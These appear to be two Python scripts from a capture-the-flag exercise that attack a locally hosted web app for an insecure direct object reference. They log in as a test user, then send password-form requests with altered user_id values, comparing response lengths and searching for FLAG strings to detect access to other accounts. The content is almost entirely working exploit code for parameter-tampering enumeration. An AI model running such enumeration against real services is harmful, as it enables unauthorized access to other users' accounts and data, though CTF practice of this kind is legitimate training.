import requests
import json

BASE_URL = "http://127.0.0.1:33029"

# Step 1: Authenticate
print("[*] Authenticating with username=test&password=test")
auth_response = requests.post(
    f"{BASE_URL}/",
    data="username=test&password=test",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    allow_redirects=False
)
print(f"[+] Auth status: {auth_response.status_code}")
print(f"[+] Auth cookies: {dict(auth_response.cookies)}")
print(f"[+] Location: {auth_response.headers.get('Location', 'N/A')}")

# Capture session cookies
session_cookies = auth_response.cookies

# Step 2: Get baseline with current user_id=10032
print("\n[*] Getting baseline with user_id=10032")
baseline_response = requests.post(
    f"{BASE_URL}/password/test",
    data="password=test&user_id=10032",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies=session_cookies,
    allow_redirects=True
)
print(f"[+] Baseline status: {baseline_response.status_code}")
print(f"[+] Baseline length: {len(baseline_response.text)}")
baseline_length = len(baseline_response.text)

# Step 3: Fuzz user_id values
test_values = [
    # Adjacent values
    10030, 10031, 10033, 10034, 10035,
    # Broader range samples
    10000, 10005, 10010, 10015, 10020,
    10040, 10045, 10050, 10055, 10060,
    # Edge cases
    1, 9999, 99999
]

print(f"\n[*] Starting IDOR fuzzing with {len(test_values)} values")
print("="*60)

findings = []

for user_id in test_values:
    resp = requests.post(
        f"{BASE_URL}/password/test",
        data=f"password=test&user_id={user_id}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=session_cookies,
        allow_redirects=True  # Follow redirects to see final page
    )
    
    content_length = len(resp.text)
    length_diff = content_length - baseline_length
    
    # Look for FLAG pattern
    import re
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    # Check for anomalies
    is_anomaly = (
        flag_match or
        content_length != baseline_length or
        resp.status_code != baseline_response.status_code
    )
    
    status = "ANOMALY" if is_anomaly else "NORMAL"
    
    finding = {
        "user_id": user_id,
        "status_code": resp.status_code,
        "content_length": content_length,
        "length_diff": length_diff,
        "flag": flag_match.group(0) if flag_match else None,
        "status": status
    }
    findings.append(finding)
    
    print(f"[+] user_id={user_id}: Status={resp.status_code}, Length={content_length} ({length_diff:+d}) [{status}]")
    
    if is_anomaly:
        print(f"  [!] ANOMALY DETECTED!")
        if flag_match:
            print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
        print(f"  Response preview (first 1000 chars):")
        print(resp.text[:1000] if len(resp.text) > 1000 else resp.text)
        print("-"*60)

# Summary
print("\n" + "="*60)
print("[*] FUZZING SUMMARY")
print("="*60)
anomalies = [f for f in findings if f["status"] == "ANOMALY"]
print(f"[+] Total tested: {len(findings)}")
print(f"[+] Anomalies found: {len(anomalies)}")

if anomalies:
    print("\n[!] ANOMALOUS RESPONSES:")
    for a in anomalies:
        print(f"  user_id={a['user_id']}: {a['flag'] if a['flag'] else 'Length difference='+str(a['length_diff'])}")
else:
    print("\n[-] No anomalies detected")

print("\n[*] All responses:")
for f in findings:
    flag_info = f", FLAG={f['flag']}" if f['flag'] else ""
    print(f"  user_id={f['user_id']}: {f['status_code']} | {f['content_length']}B ({f['length_diff']:+d}){flag_info}")

import requests
import re

BASE_URL = "http://127.0.0.1:33029"

# Step 1: Authenticate
print("[*] Authenticating...")
auth_response = requests.post(
    f"{BASE_URL}/",
    data="username=test&password=test",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    allow_redirects=False
)

session_cookies = auth_response.cookies
print(f"[+] Session cookies: {dict(session_cookies)}")

# Step 2: Test with redirects disabled to see redirect behavior
print("\n[*] Testing with redirects DISABLED (to see actual response):")
test_ids = [10032, 10030, 10031, 10033, 10000, 1]

for user_id in test_ids:
    resp = requests.post(
        f"{BASE_URL}/password/test",
        data=f"password=test&user_id={user_id}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=session_cookies,
        allow_redirects=False
    )
    
    location = resp.headers.get('Location', 'None')
    content_snippet = resp.text[:500].replace('\n', ' ')
    
    # Look for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    print(f"\n[+] user_id={user_id}:")
    print(f"    Status: {resp.status_code}")
    print(f"    Location: {location}")
    print(f"    Length: {len(resp.text)}")
    if flag_match:
        print(f"    [!] FLAG: {flag_match.group(0)}")
    if resp.status_code == 200:
        print(f"    Content: {content_snippet}...")

# Step 3: With redirects enabled, analyze the final page content
print("\n" + "="*60)
print("[*] Testing with redirects ENABLED (analyzing final page):")

for user_id in [10032, 10030, 10031, 10000]:
    resp = requests.post(
        f"{BASE_URL}/password/test",
        data=f"password=test&user_id={user_id}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=session_cookies,
        allow_redirects=True
    )
    
    # Extract user info from response
    user_match = re.search(r'Welcome[^<]*|<h1>[^<]*</h1>|<p>[^<]*</p>', resp.text)
    
    # Look for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    print(f"\n[+] user_id={user_id} (post-redirect):")
    print(f"    Final URL: {resp.url}")
    print(f"    Status: {resp.status_code}")
    print(f"    Length: {len(resp.text)}")
    
    if flag_match:
        print(f"    [!] FLAG FOUND: {flag_match.group(0)}")
    
    # Show key parts of response
    if 'Welcome' in resp.text:
        welcome = re.search(r'Welcome[^<]*', resp.text)
        if welcome:
            print(f"    Welcome msg: {welcome.group(0)}")
    
    # Check for any user identification
    user_patterns = re.findall(r'(User|John|ID|user_id)[^<]*', resp.text, re.I)
    if user_patterns:
        print(f"    User refs: {user_patterns[:3]}")

# Step 4: Detailed content comparison
print("\n" + "="*60)
print("[*] Detailed content analysis for user_id=10032 vs user_id=10030:")

resp_10032 = requests.post(
    f"{BASE_URL}/password/test",
    data="password=test&user_id=10032",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies=session_cookies,
    allow_redirects=True
)

resp_10030 = requests.post(
    f"{BASE_URL}/password/test",
    data="password=test&user_id=10030",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies=session_cookies,
    allow_redirects=True
)

print(f"\n[+] user_id=10032 full response:")
print(resp_10032.text)

print(f"\n[+] user_id=10030 full response:")
print(resp_10030.text)

# Direct comparison
if resp_10032.text == resp_10030.text:
    print("\n[!] Responses are IDENTICAL - Session cookie likely overriding POST parameter")
else:
    print("\n[!] Responses DIFFER - Potential IDOR vulnerability!")

